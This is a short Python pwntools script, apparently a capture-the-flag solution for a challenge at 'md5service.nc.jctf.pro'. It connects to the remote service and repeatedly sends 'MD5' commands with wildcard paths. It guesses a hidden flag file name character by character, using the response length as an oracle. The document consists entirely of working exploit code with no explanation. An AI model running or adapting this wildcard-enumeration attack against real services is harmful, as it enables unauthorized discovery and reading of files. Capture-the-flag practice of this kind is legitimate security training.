from pwn import *
import string

r = remote('md5service.nc.jctf.pro', 1337)

curr = ''

while True:
    print(r.recvuntil('Cmd:'))
    for c in string.ascii_lowercase + '0123456789?':
        # guess = 'MD5 /' + curr + c + '*/flag*'
        guess = 'MD5 /0c8702194e16f006e61f45d5fa0cd511/flag' + curr + c + '*'
        print(guess)
        r.sendline(guess)

        r.recvline()
        r.recvline()

        res = r.recvline()
        print(res)
        if len(res) > 10:
            curr += c
            print(curr)
            break


